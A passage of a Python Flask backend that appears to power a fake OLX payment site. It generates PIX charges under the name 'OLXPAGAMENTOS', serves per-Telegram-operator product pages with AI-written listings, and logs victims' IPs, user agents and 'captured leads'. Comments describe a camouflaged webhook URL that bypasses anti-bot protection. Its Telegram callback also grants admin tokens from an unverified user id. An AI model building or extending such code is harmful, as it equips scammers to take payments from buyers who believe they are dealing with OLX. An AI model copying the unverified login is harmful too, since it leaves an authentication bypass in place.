    payer_name     = sanitize_input(data.get('name', 'Cliente OLX'), 120)
    payer_document = re.sub(r'\D', '', sanitize_input(data.get('cpf', ''), 20))
    
    price_str = admin_bot.get_config("product_price", "630.00") if BOT_AVAILABLE else "630.00"
    try:
        c7_amount = float(price_str.replace(",", "."))
    except ValueError:
        c7_amount = 630.00

    c7_payload = {
        "amount": c7_amount,
        "callbackUrl": callback_url,
        "externalId": payment_id
    }
    if payer_name:
        c7_payload["payerName"] = payer_name
    if payer_document and len(payer_document) == 11:
        c7_payload["payerDocument"] = payer_document

    if C7_ACQUIRER_CODE:
        c7_payload["acquirer_code"] = C7_ACQUIRER_CODE

    body_str    = json.dumps(c7_payload, separators=(',', ':'))
    pix_code    = ""
    qr_code_url = ""
    c7_id       = ""
    expires_at  = ""       # ISO datetime de expiração — vem da C7 (doc sec. 4)
    c7_status   = "pending"  # status inicial sempre "pending" (doc sec. 4 / 6)

    if C7_API_KEY and "your_key" not in C7_API_KEY and "c7_live_xxx" not in C7_API_KEY:
        try:
            headers  = get_c7_auth_headers(body_str)
            # Envia body_str como string raw com Content-Type: application/json
            # (body_str deve ser EXATAMENTE o mesmo usado para gerar HMAC — doc sec.2.2)
            res  = requests.post(
                f"{C7_BASE_URL}/payment/create",
                data=body_str,
                headers=headers,
                timeout=10
            )
            if res.status_code == 429:
                print(f"[C7 API] Rate limited (429) — aguardando e usando fallback")
            elif res.status_code >= 400:
                print(f"[C7 API] Erro HTTP {res.status_code}: {res.text[:200]}")
            else:
                resp = res.json()
                if resp.get("ok") and "payment" in resp:
                    p            = resp["payment"]
                    c7_id        = p.get("id", "")
                    pix_code     = (p.get("pixCopiaECola") or p.get("emv") or
                                    p.get("qrcode") or p.get("pix_copia_e_cola") or "")
                    qr_code_url  = p.get("qrCodeBase64") or p.get("qrCodeUrl") or ""
                    expires_at   = p.get("expiresAt") or p.get("expires_at") or ""
                    c7_status    = p.get("status", "pending")
                else:
                    print(f"[C7 API] Resposta inesperada: {resp}")
        except Exception as err:
            print(f"[C7 API] Exceção: {err}")

    if not pix_code:
        # Gera PIX EMV válido com CRC-16/CCITT correto (BACEN BR Code 2.0)
        pix_key_fallback = ""
        if BOT_AVAILABLE:
            pix_key_fallback = admin_bot.get_config("pix_key", "")
        if not pix_key_fallback:
            pix_key_fallback = str(uuid.uuid4())  # UUID como chave de fallback
        txid_short = f"olx{uuid.uuid4().hex[:20]}"
        pix_code = generate_pix_emv(
            amount=c7_amount,
            merchant_name="OLXPAGAMENTOS",
            merchant_city="SAO PAULO",
            pix_key=pix_key_fallback,
            txid=txid_short
        )
        import urllib.parse
        qr_code_url = f"https://api.qrserver.com/v1/create-qr-code/?size=280x280&data={urllib.parse.quote(pix_code)}"

    record = {
        "c7_id":      c7_id,
        "externalId": payment_id,
        "amount":     f"{c7_amount:.2f}",
        "amount_fmt": f"{c7_amount:.2f}".replace(".", ","),
        "status":     c7_status if c7_id else "pending",
        "pix_code":   pix_code,
        "qr_code_url": qr_code_url,
        "expires_at": expires_at,
        "created_at": time.time(),
        "ip":         _user_ip(),
        "name":       payer_name,
        "cpf":        payer_document,
    }
    PAYMENTS_DB[payment_id] = record
    if c7_id:
        PAYMENTS_DB[c7_id] = record  # indexa também pelo ID interno da C7

    _log("PIX_GENERATED", sid, {
        "c7_id":      c7_id or "fallback-emv",
        "payment_id": payment_id,
        "amount":     f"{c7_amount:.2f}",
        "via_c7_api": bool(c7_id),
        "expires_at": expires_at,
    })

    return jsonify({
        "ok":            True,
        "success":       True,
        "payment_id":    payment_id,
        "external_id":   payment_id,
        "c7_id":         c7_id,
        "amount":        f"{c7_amount:.2f}".replace(".", ","),
        "pix_code":      pix_code,
        "pix_copy_paste": pix_code,
        "qr_code_url":   qr_code_url,
        "expires_at":    expires_at,
        "via_c7":        bool(c7_id),
    })


@app.route('/api/check-payment/<payment_id>')
def check_payment(payment_id):
    """
    Consulta status do pagamento.
    Doc C7 sec. 6: GET /payment/:id/status — autenticação apenas com API Key.
    Status possíveis: pending | approved | expired | cancelled
    """
    safe_pid = sanitize_input(payment_id, 80)
    payment  = PAYMENTS_DB.get(safe_pid)
    if not payment:
        return jsonify({"status": "not_found"}), 404

    current_status = payment.get("status", "pending")

    # Já confirmado localmente — retorna imediatamente
    if current_status in ("paid", "approved"):
        return jsonify({"payment_id": safe_pid, "status": "paid",
                        "amount": payment.get("amount"), "expires_at": payment.get("expires_at", "")})

    # Expirado ou cancelado — não precisa consultar a C7
    if current_status in ("expired", "cancelled"):
        return jsonify({"payment_id": safe_pid, "status": current_status})

    # Consulta a C7 (apenas Authorization header — doc sec. 6)
    c7_id = payment.get("c7_id")
    if c7_id and C7_API_KEY and "c7_live_xxx" not in C7_API_KEY:
        try:
            res  = requests.get(
                f"{C7_BASE_URL}/payment/{c7_id}/status",
                headers={"Authorization": f"Bearer {C7_API_KEY}"},
                timeout=6
            )
            if res.status_code == 200:
                resp   = res.json()
                if resp.get("ok") and "payment" in resp:
                    p_data = resp["payment"]
                    status = p_data.get("status", "").lower()
                    # Mapeia todos os status da doc sec. 6
                    if status in ("approved", "paid"):
                        payment["status"] = "paid"
                        payment["payer"]  = p_data.get("payer", {})
                        payment["end_to_end_id"] = p_data.get("endToEndId", "")
                        _log("PAYMENT_CONFIRMED", safe_pid, {
                            "c7_id":   c7_id, "payment_id": safe_pid,
                            "amount":  payment.get("amount"),
                            "payer":   p_data.get("payer", {}).get("name", "N/A"),
                            "e2e_id":  p_data.get("endToEndId", ""),
                        })
                        return jsonify({"payment_id": safe_pid, "status": "paid",
                                        "amount": payment.get("amount")})
                    elif status == "expired":
                        payment["status"] = "expired"
                        return jsonify({"payment_id": safe_pid, "status": "expired"})
                    elif status == "cancelled":
                        payment["status"] = "cancelled"
                        return jsonify({"payment_id": safe_pid, "status": "cancelled"})
                    # pending — continua aguardando
        except Exception as err:
            print(f"[C7 Status] {err}")

    return jsonify({"payment_id": safe_pid, "status": payment.get("status", "pending"),
                    "expires_at": payment.get("expires_at", "")})


@app.route('/api/webhook/pix', methods=['POST'])
def c7_webhook():
    """
    Webhook da Carteira do 7 — implementação completa conforme doc sec. 8-11.
    Valida:
      1. Assinatura HMAC-SHA256: HMAC(secret, ts + '.' + raw_body)   (sec. 9)
      2. Janela de timestamp: rejeita > 5 minutos (sec. 9)
      3. Idempotência: não reprocessa IDs já confirmados (sec. 11)
    Responde HTTP 2xx para a C7 não retentar (sec. 10).
    """
    raw_body   = request.get_data(as_text=True)
    sig_header = request.headers.get("X-C7-Signature", "")
    ts_header  = request.headers.get("X-C7-Timestamp", "")
    event_hdr  = request.headers.get("X-C7-Event", "")

    # ─── 1. Validação da assinatura HMAC (sec. 9) ───────────────────────────────────
    if C7_API_SECRET and "your_api_secret" not in C7_API_SECRET:
        # Fórmula da doc: HMAC(api_secret, timestamp + "." + body)
        expected = hmac.new(
            C7_API_SECRET.encode('utf-8'),
            f"{ts_header}.{raw_body}".encode('utf-8'),
            hashlib.sha256
        ).hexdigest()
        if not (sig_header and hmac.compare_digest(sig_header, expected)):
            _log("SECURITY_ALERT_WEBHOOK", "webhook", {
                "ip": _user_ip(), "reason": "HMAC inválido", "event": event_hdr
            })
            return jsonify({"error": "invalid_signature"}), 401

    # ─── 2. Validação da janela de timestamp (sec. 9) ─────────────────────────────
    try:
        ts_int = int(ts_header)
        if abs(time.time() - ts_int) > 300:  # 5 minutos = 300 segundos
            _log("SECURITY_ALERT_WEBHOOK", "webhook", {
                "ip": _user_ip(), "reason": "Timestamp fora da janela (>5min)"
            })
            return jsonify({"error": "timestamp_expired"}), 401
    except (ValueError, TypeError):
        return jsonify({"error": "invalid_timestamp"}), 400

    # ─── 3. Parse do payload (sec. 8) ─────────────────────────────────────────
    payload    = request.json or {}
    event_data = payload.get("data", {})

    # Campos do payload conforme doc sec. 8
    identifier   = sanitize_input(str(event_data.get("identifier") or ""), 80)
    correlation  = sanitize_input(str(event_data.get("correlationID") or ""), 80)
    status       = sanitize_input(str(event_data.get("status", "")), 30).upper()
    amount       = event_data.get("amount", 0)
    net          = event_data.get("net", 0)
    fee          = event_data.get("fee", 0)
    end_to_end   = sanitize_input(str(event_data.get("endToEndId") or ""), 60)
    payer_info   = event_data.get("payer", {})
    event_type   = payload.get("event", event_hdr)

    # ─── 4. Idempotência — doc sec. 11 ───────────────────────────────────────
    idempotency_key = identifier or correlation or end_to_end
    if idempotency_key and idempotency_key in PROCESSED_WEBHOOKS:
        # Já processado — responde 2xx para C7 parar de retentar (sec. 10)
        return jsonify({"ok": True, "duplicate": True}), 200

    # ─── 5-7. Atualiza pagamento e registra evento ────────────────────────────
    is_confirmed = (
        status == "APPROVED" or
        event_type in ("payment.confirmed", "payment.approved")
    )

    record = PAYMENTS_DB.get(correlation) or PAYMENTS_DB.get(identifier)

    if is_confirmed:
        if record:
            record["status"]      = "paid"
            record["payer"]       = payer_info
            record["end_to_end_id"] = end_to_end
            record["net_amount"]  = net
            record["fee_amount"]  = fee
        # Marca como processado
        if idempotency_key:
            PROCESSED_WEBHOOKS.add(idempotency_key)
        _log("PAYMENT_CONFIRMED", correlation or identifier or "webhook", {
            "c7_id":      identifier,
            "payment_id": correlation,
            "amount":     amount,
            "net":        net,
            "fee":        fee,
            "payer_name": payer_info.get("name", "N/A"),
            "end_to_end": end_to_end,
            "event":      event_type,
            "ip":         record.get("ip", "N/A") if record else "N/A",
        })

    # ─── 8. Responde HTTP 2xx (sec. 10) ──────────────────────────────────────
    return jsonify({"ok": True}), 200


@app.route('/api/c7/balance', methods=['POST'])
def c7_balance():
    """
    Consulta saldo da conta C7 — doc sec. 7.
    POST /account/balance com autenticação API Key + HMAC-SHA256.
    Retorna: saldo, limites, taxas.
    """
    if not C7_API_KEY or "c7_live_xxx" in C7_API_KEY:
        return jsonify({"ok": False, "error": "api_key_não_configurada"}), 401
    try:
        body_str = "{}"  # body vazio mas ainda participa do HMAC
        headers  = get_c7_auth_headers(body_str)
        res = requests.post(
            f"{C7_BASE_URL}/account/balance",
            data=body_str,
            headers=headers,
            timeout=8
        )
        if res.status_code != 200:
            return jsonify({"ok": False, "error": f"C7 retornou {res.status_code}",
                            "detail": res.text[:200]}), res.status_code
        resp = res.json()
        # Normaliza a resposta conforme doc sec. 7
        account = resp.get("account", {})
        limits  = account.get("limits", {})
        fees    = account.get("fees", {})
        return jsonify({
            "ok":            resp.get("ok", True),
            "balance":       account.get("balance", "0.00"),
            "limit_generate": limits.get("generate", "0.00"),
            "min_amount":    limits.get("min_amount", "1.00"),
            "fee_pct":       fees.get("depositPct", 0),
            "fee_fixed":     fees.get("depositFixed", 0),
            "raw":           account,
        }), 200
    except Exception as err:
        print(f"[C7 Balance] {err}")
        return jsonify({"ok": False, "error": "gateway_error", "detail": str(err)}), 500


# ─── ASSISTENTE IA PARA IMAGENS E ANÚNCIOS (GEMINI STUDIO INTEGRADO) ───────────
GEMINI_STUDIO_KEY = os.environ.get("GEMINI_STUDIO_KEY", "")

@app.route('/api/admin/analyze-ai', methods=['POST'])
def api_admin_analyze_ai():
    """Analisa nome/imagem do produto e sugere título otimizado e descrição rica via IA Gemini Studio."""
    data = request.json or {}
    product_raw = sanitize_input(data.get("product_raw", ""), 200)
    image_url = sanitize_input(data.get("image_url", ""), 500)
    
    # Se a API Key do Gemini estiver disponível, tenta gerar análise com Gemini
    if GEMINI_STUDIO_KEY and "AQ.Ab8" in GEMINI_STUDIO_KEY:
        try:
            # Chamada direta para REST API da Gemini para visão & texto
            gemini_url = f"https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key={GEMINI_STUDIO_KEY}"
            prompt_text = f"Analise o produto '{product_raw}' com imagem '{image_url}'. Gere um JSON com: 'title' (título de anúncio OLX chamativo), 'price' (valor estimado numérico ex: 750.00), e 'description' (descrição vendedora completa com detalhes de estado, envio e garantia)."
            
            payload = {
                "contents": [{
                    "parts": [{"text": prompt_text}]
                }],
                "generationConfig": {
                    "response_mime_type": "application/json"
                }
            }
            res = requests.post(gemini_url, json=payload, timeout=8)
            if res.status_code == 200:
                resp_json = res.json()
                text_out = resp_json['candidates'][0]['content']['parts'][0]['text']
                parsed = json.loads(text_out)
                return jsonify({
                    "ok": True,
                    "title": parsed.get("title", product_raw.title()),
                    "price": str(parsed.get("price", "750.00")),
                    "description": parsed.get("description", ""),
                    "image_url": image_url
                })
        except Exception as err:
            print(f"[GEMINI STUDIO AI] {err}")

    # Fallback inteligente
    if TG_WH_AVAILABLE:
        ai_res = tg_wh.generate_ai_ad(product_raw or "Produto Anunciado")
        return jsonify({
            "ok": True,
            "title": ai_res.get("product_name"),
            "price": ai_res.get("product_price"),
            "description": ai_res.get("product_description"),
            "image_url": image_url
        })
    return jsonify({
        "ok": True,
        "title": product_raw.title() if product_raw else "Produto Exclusivo",
        "price": "650.00",
        "description": f"{product_raw.title()} em excelente estado de conservação, testado e 100% funcional. Acompanha caixa e acessórios.",
        "image_url": image_url
    })


@app.route('/api/products', methods=['GET'])
def api_products_list():
    """Lista todos os modelos de produto do banco."""
    if not BOT_AVAILABLE:
        return jsonify({"ok": False, "error": "bot_not_available"}), 503
    conn = admin_bot.get_db()
    rows = conn.execute(
        "SELECT id, code, name, price, description, image_url FROM product_templates ORDER BY id ASC"
    ).fetchall()
    conn.close()
    products = [
        {"id": r["id"], "code": r["code"], "name": r["name"],
         "price": r["price"], "description": r["description"] or "",
         "image_url": r["image_url"] or ""}
        for r in rows
    ]
    return jsonify({"ok": True, "products": products})


@app.route('/api/products', methods=['POST'])
def api_products_create():
    """Cria um novo modelo de produto."""
    if not BOT_AVAILABLE:
        return jsonify({"ok": False, "error": "bot_not_available"}), 503
    data = request.json or {}
    name        = sanitize_input(data.get('name', ''), 200)
    price       = sanitize_input(data.get('price', ''), 20)
    description = sanitize_input(data.get('description', ''), 2000)
    image_url   = sanitize_input(data.get('image_url', ''), 500)
    code        = sanitize_input(data.get('code', ''), 80)

    if not name or not price:
        return jsonify({"ok": False, "error": "name e price são obrigatórios"}), 400

    # Auto-gera code se não fornecido
    if not code:
        code = re.sub(r'[^a-z0-9_]', '_', name.lower().strip())[:40]
        code = re.sub(r'_+', '_', code).strip('_')
        code = f"{code}_{uuid.uuid4().hex[:6]}"

    try:
        conn = admin_bot.get_db()
        conn.execute(
            "INSERT INTO product_templates(code, name, price, description, image_url) VALUES(?,?,?,?,?)",
            (code, name, price, description, image_url)
        )
        conn.commit()
        row_id = conn.execute("SELECT last_insert_rowid() as id").fetchone()["id"]
        conn.close()
    except Exception as e:
        if "UNIQUE" in str(e):
            return jsonify({"ok": False, "error": f"Código '{code}' já existe. Use outro nome."}), 409
        return jsonify({"ok": False, "error": str(e)}), 500

    base_url = request.host_url.rstrip('/')
    public_link = f"{base_url}/p/{code}"
    _log("PRODUCT_CREATED", str(uuid.uuid4()), {"code": code, "name": name, "price": price})
    return jsonify({"ok": True, "id": row_id, "code": code, "public_link": public_link}), 201


@app.route('/api/products/<code>', methods=['PUT'])
def api_products_update(code):
    """Edita um modelo de produto existente pelo código."""
    if not BOT_AVAILABLE:
        return jsonify({"ok": False, "error": "bot_not_available"}), 503
    safe_code = sanitize_input(code, 80)
    data = request.json or {}

    conn = admin_bot.get_db()
    row = conn.execute(
        "SELECT id FROM product_templates WHERE code=?", (safe_code,)
    ).fetchone()
    if not row:
        conn.close()
        return jsonify({"ok": False, "error": "Produto não encontrado"}), 404

    fields, values = [], []
    allowed = {'name': 200, 'price': 20, 'description': 2000, 'image_url': 500}
    for field, max_len in allowed.items():
        if field in data and isinstance(data[field], str):
            fields.append(f"{field}=?")
            values.append(sanitize_input(data[field], max_len))

    if not fields:
        conn.close()
        return jsonify({"ok": False, "error": "Nenhum campo válido para atualizar"}), 400

    values.append(safe_code)
    conn.execute(f"UPDATE product_templates SET {', '.join(fields)} WHERE code=?", values)
    conn.commit()
    conn.close()
    _log("PRODUCT_UPDATED", str(uuid.uuid4()), {"code": safe_code, "fields": list(data.keys())})
    return jsonify({"ok": True, "code": safe_code})


@app.route('/api/products/<code>', methods=['DELETE'])
def api_products_delete(code):
    """Remove um modelo de produto."""
    if not BOT_AVAILABLE:
        return jsonify({"ok": False, "error": "bot_not_available"}), 503
    safe_code = sanitize_input(code, 80)
    conn = admin_bot.get_db()
    result = conn.execute(
        "DELETE FROM product_templates WHERE code=?", (safe_code,)
    )
    conn.commit()
    conn.close()
    if result.rowcount == 0:
        return jsonify({"ok": False, "error": "Produto não encontrado"}), 404
    _log("PRODUCT_DELETED", str(uuid.uuid4()), {"code": safe_code})
    return jsonify({"ok": True})


@app.route('/api/products/<code>/link', methods=['GET'])
def api_product_link(code):
    """Retorna o link público personalizado de um produto."""
    if not BOT_AVAILABLE:
        return jsonify({"ok": False, "error": "bot_not_available"}), 503
    safe_code = sanitize_input(code, 80)
    conn = admin_bot.get_db()
    row = conn.execute(
        "SELECT name, price FROM product_templates WHERE code=?", (safe_code,)
    ).fetchone()
    conn.close()
    if not row:
        return jsonify({"ok": False, "error": "Produto não encontrado"}), 404
    base_url = request.host_url.rstrip('/')
    public_link = f"{base_url}/p/{safe_code}"
    return jsonify({"ok": True, "code": safe_code, "name": row["name"], "price": row["price"], "public_link": public_link})


@app.route('/api/products/<code>/apply', methods=['POST'])
def api_products_apply(code):
    """Define um produto como padrão ativo da loja (sobrescreve config global)."""
    if not BOT_AVAILABLE:
        return jsonify({"ok": False, "error": "bot_not_available"}), 503
    safe_code = sanitize_input(code, 80)
    conn = admin_bot.get_db()
    row = conn.execute(
        "SELECT name, price, description, image_url FROM product_templates WHERE code=?", (safe_code,)
    ).fetchone()
    conn.close()
    if not row:
        return jsonify({"ok": False, "error": "Produto não encontrado"}), 404

    admin_bot.set_config("product_name",        row["name"])
    admin_bot.set_config("product_price",       row["price"])
    admin_bot.set_config("product_description", row["description"] or "")
    if row["image_url"]:
        admin_bot.set_config("product_image",   row["image_url"])
        admin_bot.set_config("product_image1",  row["image_url"])
    _log("PRODUCT_APPLIED", str(uuid.uuid4()), {"code": safe_code, "name": row["name"]})
    return jsonify({"ok": True, "applied": safe_code, "name": row["name"]})


# ─── TELEGRAM WEBHOOK ────────────────────────────────────────────────────────
# URL camuflada: /tg/<webhook_secret> — o secret vem da variavel de ambiente
_TG_WEBHOOK_SECRET = os.environ.get("WEBHOOK_SECRET",
    hashlib.sha256(os.environ.get("TELEGRAM_BOT_TOKEN", "notoken").encode()).hexdigest()[:32])

@app.route(f'/tg/{_TG_WEBHOOK_SECRET}', methods=['POST'])
def telegram_webhook():
    """Recebe updates do Telegram e despacha para tg_webhook.dispatch().
    IMPORTANTE: Esta rota bypassa o WAF anti-bot — o Telegram usa User-Agent de servidor.
    """
    if not TG_WH_AVAILABLE:
        return '', 200
    try:
        update = request.get_json(force=True, silent=True) or {}
        tg_wh.dispatch(update)
    except Exception as e:
        print(f"[webhook] erro: {e}")
    # Sempre retorna 200 OK para o Telegram não tentar reenviar
    return '', 200


@app.route('/api/webhook/register')
def register_webhook():
    """Registra o webhook na API do Telegram. Chame uma vez após o deploy."""
    if not TG_WH_AVAILABLE:
        return jsonify({"error": "tg_webhook not loaded"}), 503
    base = os.environ.get("BASE_URL", request.host_url.rstrip("/"))
    url  = f"{base}/tg/{_TG_WEBHOOK_SECRET}"
    res  = tg_wh.set_webhook(url)
    return jsonify({"ok": res.get("ok"), "webhook_url": url, "tg_response": res})


# ─── MULTI-TENANT SLUG PAGES ─────────────────────────────────────────────────
@app.route('/s/<slug>')
def slug_page(slug):
    """Serve a pagina do produto personalizada para cada usuario do Telegram."""
    if not TG_WH_AVAILABLE:
        abort(404)
    tg_id = tg_wh.get_tg_id_by_slug(slug)
    if tg_id is None:
        abort(404)
    ip = _user_ip()
    sid = str(uuid.uuid4())
    ua  = request.headers.get('User-Agent', '')
    tg_wh.upsert_tg_session(tg_id, slug, sid, ip, ua)
    tg_wh.log_tg_event(tg_id, slug, "PAGE_ENTRY", sid, ip, {"ua": ua[:120]})
    _log("PAGE_ENTRY", sid, {"slug": slug, "ip": ip})
    # Passa o slug para o template via JS
    return render_template('index.html', page_slug=slug)


@app.route('/api/config/<slug>')
def api_config_slug(slug):
    """Retorna a config do usuario dono desse slug (para paginas /s/<slug>)."""
    if not TG_WH_AVAILABLE:
        return jsonify({"error": "not_available"}), 503
    tg_id = tg_wh.get_tg_id_by_slug(slug)
    if tg_id is None:
        return jsonify({"error": "slug_not_found"}), 404
    cfg = tg_wh.get_all_cfg(tg_id)
    return jsonify(cfg)


@app.route('/api/event/<slug>', methods=['POST'])
def api_event_slug(slug):
    """Registra evento de uma pagina /s/<slug> no banco do usuario."""
    if not TG_WH_AVAILABLE:
        return jsonify({"ok": False}), 503
    tg_id = tg_wh.get_tg_id_by_slug(slug)
    if tg_id is None:
        return jsonify({"ok": False}), 404
    ip  = _user_ip()
    sid = request.headers.get('X-Session-Id', str(uuid.uuid4()))
    data = request.get_json(silent=True) or {}
    event_type = sanitize_input(data.pop('event', 'UNKNOWN'), 50)
    # Marca sessao convertida em eventos-chave
    if event_type in ("LEAD_CAPTURED", "PAYMENT_CONFIRMED"):
        tg_wh.mark_tg_converted(tg_id, sid)
    tg_wh.log_tg_event(tg_id, slug, event_type, sid, ip, data)
    _log(event_type, sid, {"slug": slug, **data})
    return jsonify({"ok": True})


@app.route('/api/sessions/<slug>')
def api_sessions_slug(slug):
    """Retorna sessoes do usuario dono do slug (para admin panel multi-tenant)."""
    if not TG_WH_AVAILABLE:
        return jsonify({"error": "not_available"}), 503
    tg_id = tg_wh.get_tg_id_by_slug(slug)
    if tg_id is None:
        return jsonify({"error": "slug_not_found"}), 404
    limit = min(int(request.args.get('limit', 20)), 100)
    sessions = tg_wh.get_tg_sessions(tg_id, limit)
    return jsonify({"sessions": sessions, "count": len(sessions)})


@app.route('/tg/login')
def tg_login():
    """Redireciona para o login do Telegram OAuth."""
    redirect_uri = f"{BASE_URL}/tg/callback"
    oauth_url = f"https://oauth.telegram.org/auth?client_id={TELEGRAM_CLIENT_ID}&redirect_uri={redirect_uri}&response_type=code"
    return jsonify({"login_url": oauth_url, "redirect_uri": redirect_uri})


@app.route('/tg/callback')
def tg_callback():
    """Recebe a autenticação do Telegram OAuth e gera um token seguro para o painel admin."""
    code = request.args.get('code')
    if not code:
        # Tenta pegar dados diretos de widgets Telegram se enviados via hash
        hash_val = request.args.get('hash')
        tg_id = request.args.get('id')
        if tg_id and BOT_AVAILABLE:
            token = admin_bot.generate_admin_token(int(tg_id))
            return f"<script>window.location.href='/admin?token={token}';</script>"
        return jsonify({"error": "code_missing"}), 400
    
    # Valida código com Telegram OAuth
    try:
        resp = requests.post(
            "https://oauth.telegram.org/token",
            data={
                "client_id": TELEGRAM_CLIENT_ID,
                "client_secret": TELEGRAM_CLIENT_SECRET,
                "grant_type": "authorization_code",
                "code": code,
                "redirect_uri": f"{BASE_URL}/tg/callback"
            },
            timeout=10
        )
        data = resp.json()
        if data.get("access_token") and BOT_AVAILABLE:
            user_id = data.get("user_id", 0)
            token = admin_bot.generate_admin_token(int(user_id))
            return f"<script>window.location.href='/admin?token={token}';</script>"
    except Exception as err:
        print(f"[TG OAUTH ERROR] {err}")
    
    return jsonify({"error": "authentication_failed"}), 401


if __name__ == '__main__':
    print("[+] OLPG Hardened Platform running securely on http://127.0.0.1:5000")
    debug_mode = os.environ.get("FLASK_DEBUG", "false").lower() == "true"
    app.run(host='127.0.0.1', port=5000, debug=debug_mode)
